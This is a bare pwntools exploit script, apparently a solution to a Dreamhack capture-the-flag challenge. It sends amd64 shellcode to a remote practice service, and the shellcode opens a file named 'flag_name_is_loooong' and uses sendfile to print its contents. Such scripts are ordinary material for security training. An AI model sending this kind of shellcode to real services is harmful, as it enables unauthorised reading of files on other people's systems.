from pwn import *

context.arch = 'amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 18211
r = remote(HOST, PORT)

sh = asm('''
    xor rax, rax
    push rax
    mov rax, 0x676e6f6f6f6f
    push rax
    mov rax, 0x6f6f6c5f73695f65
    push rax
    mov rax, 0x6d616e5f67616c66
    push rax
    mov rdi, rsp
    mov rax, 2
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rsi, rax
    mov rax, 40
    mov rdi, 1
    mov rdx, 0
    mov r10, 0x1000
    syscall
''')

r.sendlineafter(b'shellcode: ', sh)

r.interactive()